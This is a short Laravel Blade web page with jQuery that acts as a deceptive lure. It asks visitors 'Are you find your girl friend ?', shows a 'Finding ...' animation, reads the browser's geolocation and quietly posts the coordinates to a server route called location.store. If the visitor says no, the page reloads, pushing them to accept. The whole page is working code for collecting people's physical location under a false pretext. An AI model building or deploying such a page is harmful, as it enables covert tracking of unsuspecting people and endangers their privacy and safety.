<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <title>Document</title>
</head>

<body>
    <div class="container d-none" id="animation">
        <div class="text-center">
            <img
                src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7e7e889a-de90-46e6-b7e0-a80a0e698de6/dbpu9b-51118e9e-16bd-4a28-bbe6-921fc1da8181.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzdlN2U4ODlhLWRlOTAtNDZlNi1iN2UwLWE4MGEwZTY5OGRlNlwvZGJwdTliLTUxMTE4ZTllLTE2YmQtNGEyOC1iYmU2LTkyMWZjMWRhODE4MS5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.h309S-rnZJWgrquS7zLKqNmCyGpKi6EydLGfeGlmwSY">
        </div>
        <div class="row mt-2">
            <div class="col-12 text-center">
                <b id ="Result">Finding ...</b>
            </div>
            <div class="col-12 mt-3 text-center">
                <p id="error" class="text-danger d-none">Sorry, <b>Please Click Allow Your Location</p>

            </div>
        </div>
    </div>

   

</body>

<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script>
    const LocationStoreUrl = "{{route('location.store')}}";
    const csrfToken =$('meta[name="csrf-token"]'). attr('content');
    
    $. ajaxSetup({ headers: { 'X-CSRF-TOKEN':csrfToken  } });
    </script>
{{-- <script src="{{asset('assets/js/location.js')}}"></script> --}}
<script>
    $(document).ready(function(){
    if (confirm('Are you find your girl friend ?') == true) {
        console.log(`you click yes`);
        $("#animation").removeClass('d-none');

        getLocation();
        
      } else {
        location.reload();
        // getLocation
      }


      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          // alert("Geolocation is not supported by this browser.");
        }
      }
      
      function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const coordinates = `lat: ${latitude}, lng: ${longitude}`;
        $("#Result").text(coordinates);
        $.ajax({
          url:LocationStoreUrl,
          method:'POST',
          data:{coordinates:coordinates},
          success: function(res){
            // console.log(`res`,res);
            
          }
        })
        // alert("Latitude: " + latitude + ", Longitude: " + longitude);
      }
});
</script>

</html>
